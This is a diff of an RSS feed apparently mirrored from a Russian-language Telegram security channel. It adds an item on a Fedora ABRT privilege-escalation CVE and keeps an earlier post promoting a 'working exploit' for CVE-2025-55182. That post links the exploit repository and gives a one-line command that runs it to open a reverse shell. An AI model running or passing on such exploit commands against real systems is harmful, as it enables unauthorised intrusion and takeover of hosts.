@@ -1,5 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Fri, 05 Dec 2025 11:53:32 +0000</lastBuildDate><item><title>Рабочий эксплоит</title><link>https://t.me/P0x3k_1N73LL1G3NC3/204</link><description>Рабочий эксплоит
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Sun, 07 Dec 2025 06:50:15 +0000</lastBuildDate><item><title>CVE-2025-12744: Local Privilege Escalation in Fedora Linux via ABRT.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/205</link><description>CVE-2025-12744: Local Privilege Escalation in Fedora Linux via ABRT.
+The ABRT (Automatic Bug Reporting Tool) daemon is a root process that runs an HTTP server on a world-writable UNIX socket to accept error reports from any process. It passes 12 characters of user-controlled text directly into a shell command, with minimal validation. Using a specially crafted multi-stage payload, an attacker can force the ABRT daemon to run arbitrary shell commands. This includes escaping ABRT’s systemd sandbox and gaining complete control over the system.
+Writeup: https://initblog.com/2025/abrt-root/
+POC: https://github.com/initstring/abrt_root
+
+[Media: Фото]</description><pubDate>Sun, 07 Dec 2025 06:50:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_205</guid></item><item><title>Рабочий эксплоит</title><link>https://t.me/P0x3k_1N73LL1G3NC3/204</link><description>Рабочий эксплоит
 Спустя сутки после тряски с нейрослопом, его, наконец, написали https://github.com/Spritualkb/CVE-2025-55182-exp (сырой запрос можно найти тут). Работает на любом уязвимом приложении из коробки, я уже проверил сам.
 Получить шелл в одну команду можно так
 python3 exp.py http://127.0.0.1:3000 --revshell 127.0.0.1 1234
